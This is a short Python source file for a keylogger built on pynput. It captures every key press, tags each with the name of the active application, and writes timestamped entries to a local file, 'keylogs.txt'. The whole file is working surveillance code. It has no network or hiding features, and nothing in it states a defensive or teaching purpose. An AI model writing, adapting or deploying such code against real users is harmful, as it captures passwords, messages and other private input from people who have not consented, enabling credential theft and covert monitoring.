import logging

import get_current_app
from pynput.keyboard import Key, Listener

log_dir = ""
logging.basicConfig(
    filename=log_dir + "keylogs.txt",
    level=logging.DEBUG,
    format="%(asctime)s: %(message)s",
)


def on_press(key):
    active_app_name = get_current_app.get_active_app_name()
    clean_app_name = active_app_name.ljust(25)
    logging.info(f"{clean_app_name}: {key}")


def run_klog():
    with Listener(on_press=on_press) as listener:
        listener.join()
